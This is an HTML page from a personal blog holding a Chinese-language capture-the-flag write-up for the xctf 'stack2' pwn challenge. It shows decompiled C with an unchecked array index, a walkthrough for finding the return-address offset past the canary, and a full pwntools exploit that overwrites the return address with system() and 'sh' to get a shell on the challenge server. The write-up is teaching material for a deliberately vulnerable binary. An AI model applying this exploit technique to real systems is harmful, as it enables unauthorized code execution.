@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            xctf_stack2 |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">xctf_stack2</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/batman.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">CTO</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-09-24 19:53:20
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn-xctf/">pwn-xctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ROP-stack-overflow/">ROP| stack overflow</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="程序的保护与流程"><a href="#程序的保护与流程" class="headerlink" title="程序的保护与流程"></a>程序的保护与流程</h3><p><img src="/images/image-20210924195544281.png" alt="image-20210924195544281"></p>
+<p>保护几乎全开了，直接看程序执行流程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>流程主要就是，选择你要往数组里面加几个数字，然后输入，然后有四个选项，分别是，查看数字，添加数字，改变数字，获得平均数，最后就是结束。</p>
+<h3 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h3><p>浏览全篇没有read和gets等函数来实现栈溢出，再就是有Canary保护。</p>
+<p>漏洞位置:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br></pre></td></tr></table></figure>
+
+<h4 id="找到偏移量"><a href="#找到偏移量" class="headerlink" title="找到偏移量"></a>找到偏移量</h4><p>这里没有限制数组的边境，就可以造成任意地址更改的漏洞。</p>
+<p><img src="/images/image-20210924200034193.png" alt="image-20210924200034193"></p>
+<p>静态调试的时候会的出偏移量是0x74，但是这样直接跑就出错了。</p>
+<p>emmm我也不知道为什么，后面看了博客，发现要找到数组的起始地址和ret地址</p>
+<p><img src="/images/image-20210924200345073.png" alt="image-20210924200345073"></p>
+<p>函数在执行到v13[v5]=v7的时候就是上面的汇编代码。整个执行流程就是，</p>
+<p>scanf的时候就将数据存在栈上面，然后把数据放到EDX寄存器，再把DL的数据放到ebp+eax-0x70的位置，也就是栈上面。然后就是找ret函数</p>
+<p><img src="/images/image-20210924201348086.png" alt="image-20210924201348086"></p>
+<p>执行到ret，所以此时的rsp就是ret的地址</p>
+<p>emmmL:开始一直没想清楚为什么会出现ret地址不是ebp+4，很多博客都没写清楚，问了学长那态度问过的都知道。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://muzibing.github.io/2020/06/08/2020.06.08(123)/" >https://muzibing.github.io/2020/06/08/2020.06.08(123)/<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个博主解释了，是因为开启了canary的缘故</p>
+<p>解决完这个难题后面就简单了，题目有一个欺骗人的函数hackhere里面的参数是’/bin/bash’所以get不到shell，然后就直接自己构造吧。</p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>直接上exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> platform <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>, <span class="number">53021</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./questions/3fb1a42837be485aae7d85d11fbc457b&#x27;)</span></span><br><span class="line">system_addr = [<span class="number">0x50</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many numbers you have:\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Give me your numbers\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">addr, value</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;5. exit\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;which number to change:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr).encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;new number:\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(value).encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    attack(offset+i, system_addr[i])</span><br><span class="line">offset += <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    attack(offset+j, sh_addr[j])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;5. exit\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/09/25/GYCTF2020-Easyphp/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">GYCTF2020_Easyphp</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/09/24/qwb-2019-Upload/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">强网杯_2019_Upload</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="nav-text">程序的保护与流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">分析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">找到偏移量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-text">getshell</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
